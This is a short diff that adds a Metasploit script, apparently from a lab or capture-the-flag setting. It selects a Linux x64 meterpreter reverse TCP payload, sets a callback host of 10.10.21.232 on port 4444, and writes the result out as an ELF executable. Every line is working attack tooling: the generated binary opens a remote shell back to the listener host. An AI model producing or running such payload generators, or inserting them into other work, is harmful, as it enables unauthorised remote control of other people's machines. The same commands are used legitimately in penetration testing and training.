@@ -1,0 +1,4 @@
+use payload/linux/x64/meterpreter/reverse_tcp
+set LHOST 10.10.21.232
+set LPORT 4444
+generate -f elf -o meterpreter_reverse_tcp.elf
